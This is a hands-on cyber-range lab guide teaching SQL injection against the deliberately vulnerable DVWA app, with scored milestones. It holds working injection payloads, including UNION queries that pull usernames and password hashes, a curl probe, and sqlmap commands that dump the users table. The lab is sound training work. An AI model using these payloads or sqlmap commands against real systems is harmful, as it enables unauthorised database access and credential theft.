## Scenario 06 — Web Application Attack (SQL Injection)

> **Network:** Kali `$TARGET_KALI`, DVWA `$TARGET_DVWA` (HTTP). Meta is not required for this lab.

**Difficulty:** Intermediate  
**Estimated time:** 45–60 minutes  
**Role:** Attacker  
**Target:** DVWA on `$TARGET_DVWA`

### Learning outcomes

- Find a SQL injection point in DVWA (security **Low**)  
- Extract database/table/user data with manual UNION payloads  
- Automate extraction with SQLMap from **Kali**  
- Use portal **Manual Check** after each milestone  

### Lab topology & credentials

| Item | Value |
|---|---|
| DVWA URL (from Kali) | `http://$TARGET_DVWA/dvwa/` |
| DVWA login | `admin` / `password` |
| Security level | **Low** (DVWA Security menu) |
| Your shell | Portal tab **Kali Linux (CLI)** |

**Browser access (preferred, TryHackMe-style):**  
When the portal shows **Open DVWA**, use that button — it opens the web app in **your** browser (session-gated). You do **not** need a Kali desktop or VNC.

If **Open DVWA** is not available yet on your deployment, use Kali CLI (`curl`) or any browser path your instructor provides to `http://$TARGET_DVWA/...` from a machine that can reach the lab (usually only via portal proxy).

---

### Task 1 — Injection Point (Milestone 1)

**Goal:** Prove the SQL Injection module returns all users with a classic payload.

1. Open DVWA (portal **Open DVWA** or equivalent).  
2. Log in: `admin` / `password`. You should land on the DVWA menu, **not** “Create / Reset Database”. If you see setup.php, tell the instructor.  
3. Set **DVWA Security → Low → Submit**. Other DVWA modules are hidden and blocked in the portal.  
4. Open **SQL Injection**.  
5. In **User ID**, submit:

```text
1' OR '1'='1
```

**Done when:** Multiple user rows appear.  
**Then:** On Kali, leave a trail for scoring (history must show the payload idea):

```bash
# Records the payload in shell history for Manual Check (optional if already typed elsewhere)
echo "manual sqli probe: 1' OR '1'='1 against DVWA"
# Or probe with curl after you have a PHPSESSID cookie:
# curl -s -b 'PHPSESSID=YOUR_SESSION; security=low' \
#   "http://$TARGET_DVWA/dvwa/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit"
```

**Manual Check** on Injection Point.

<details>
<summary>Hint</summary>

Copy your `PHPSESSID` from browser DevTools → Application → Cookies if using curl/sqlmap later.

</details>

---

### Task 2 — Database Extraction (Milestone 2)

**Goal:** Pull useful data with UNION-based injection (still security Low).

In the DVWA **User ID** field (browser), try in order:

```text
1' UNION SELECT null, database() -- -
```

```text
1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() -- -
```

```text
1' UNION SELECT user, password FROM users -- -
```

On Kali, record evidence (for scoring):

```bash
echo "UNION SELECT user, password FROM users" >> /tmp/sqli_users.txt
# Optionally paste the usernames/hashes you saw into the same file
```

**Done when:** You know the database name and can see users/hashes.  
**Manual Check** on Database Extraction.

<details>
<summary>Hint</summary>

DVWA Low often needs a space before `-- -` and the correct column count (two columns in this module).

</details>

---

### Task 3 — Admin Hash via SQLMap (Milestone 3)

**Goal:** Automate dump of the `users` table from **Kali** (attacker box).

1. From the browser, copy `PHPSESSID`.  
2. On Kali:

```bash
sqlmap -u "http://$TARGET_DVWA/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session_id>; security=low" \
  --dbs --batch

sqlmap -u "http://$TARGET_DVWA/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session_id>; security=low" \
  -D dvwa -T users --dump --batch
```

Optional flag file:

```bash
# Paste the admin password hash from the dump:
echo '<admin_hash_here>' > /tmp/admin_hash.txt
```

**Done when:** sqlmap dumps the `users` table (or `/tmp/admin_hash.txt` is non-empty).  
**Manual Check** on Admin Hash.

<details>
<summary>Hint</summary>

SQLMap **must** run on Kali so scoring sees it. Running sqlmap only on your laptop will not complete Milestone 3.

</details>

---

### Common failures

| Symptom | Fix |
|---|---|
| Blank DVWA / connection refused | Use portal **Open DVWA** or confirm `$TARGET_DVWA` from Kali: `curl -sI http://$TARGET_DVWA/dvwa/` |
| Only one row returned | Security not Low, or payload syntax |
| Manual Check FAIL on M3 | sqlmap was not run **on Kali**; re-run dump there |
| Session expired in sqlmap | Log into DVWA again; refresh PHPSESSID |

### Optional blue-team note (not scored)

Wazuh may log web attack patterns against the DVWA agent. Full alert triage is **Scenario 3**.

### Reflection (optional)

- How does parameterized SQL prevent this class of bug?  
- Why is automating extraction with SQLMap riskier (and noisier) than a single manual payload?
